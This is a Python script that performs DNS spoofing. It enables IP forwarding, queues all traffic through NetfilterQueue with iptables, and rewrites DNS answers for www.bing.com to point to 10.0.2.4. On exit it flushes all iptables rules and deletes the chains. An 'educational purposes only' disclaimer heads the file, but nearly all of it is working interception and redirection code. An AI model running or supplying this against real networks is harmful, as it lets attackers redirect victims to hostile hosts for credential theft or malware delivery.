#!/usr/bin/env python
# [-] echo 1 > /proc/sys/net/ipv4/ip_forward
# [-] iptables -I INPUT -j NFQUEUE --queue-num 0
# [-] iptables -I OUTPUT -j NFQUEUE --queue-num 0
# from netfilterqueue import NetfilterQueue
#!/usr/bin/env python3
"""
Network Packet Manipulation Script

Disclaimer:
This script is designed for educational purposes only. It should be used
strictly in controlled environments. Unauthorized network packet manipulation,
interception, and modification can be illegal and unethical in many situations.
Users are advised to obtain proper authorization and consent before using this
script in any network environment.

Usage:
This script configures iptables to redirect traffic to a NetfilterQueue,
where packets are processed and potentially modified. Ensure you have the
necessary permissions and understand the implications of these modifications.
Run this script with root privileges due to the nature of network operations
involved. Use caution and be aware of the ethical and legal implications.
"""

import subprocess
import netfilterqueue
import scapy.all as scapy

def execute_system_command(command):
    """
    Execute a system command.
    
    :param command: List of command strings.
    """
    try:
        subprocess.run(command, check=True)
        print(f"Executed command: {' '.join(command)}")
    except subprocess.CalledProcessError as error:
        print(f"Error executing {' '.join(command)}: {error}")

def setup_network_configuration():
    """
    Configure network settings and iptables rules.
    """
    commands = [
        ["sysctl", "-w", "net.ipv4.ip_forward=1"],
        ["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"],
        ["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    ]

    for command in commands:
        execute_system_command(command)

def clear_iptables():
    """
    Flush iptables rules and delete chains.
    """
    commands = [
        ["iptables", "--flush"],
        ["iptables", "--delete-chain"]
    ]

    for command in commands:
        try:
            subprocess.run(command, check=True)
            print(f"Cleared iptables with command: {' '.join(command)}")
        except subprocess.CalledProcessError as error:
            print(f"Error clearing iptables: {error}")

def process_network_packet(packet):
    """
    Process and potentially modify each packet captured by NetfilterQueue.
    
    :param packet: The packet object from NetfilterQueue.
    """
    target_host = "www.bing.com"
    redirect_ip = "10.0.2.4"
    
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            queried_host = scapy_packet[scapy.DNSQR].qname
            if target_host in str(queried_host):
                # answer = scapy.DNSRR(rdata=redirect_ip)
                answer = scapy.DNSRR(rrname=queried_host, rdata=redirect_ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                
                packet.set_payload(bytes(scapy_packet))
                print(scapy.IP(packet.get_payload()))
        packet.accept()
    except Exception as error:
        print(f"Error processing packet: {error}")

def main():
    """
    Main function to set up and run the NetfilterQueue.
    """
    try:
        setup_network_configuration()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_network_packet)
        print("Starting packet processing...")
        queue.run()
    except KeyboardInterrupt:
        print("Stopping packet processing...")
    except Exception as error:
        print(f"An unexpected error occurred: {error}")
    finally:
        queue.unbind()
        clear_iptables()
        print("Queue unbound and iptables cleared.")

if __name__ == "__main__":
    main()
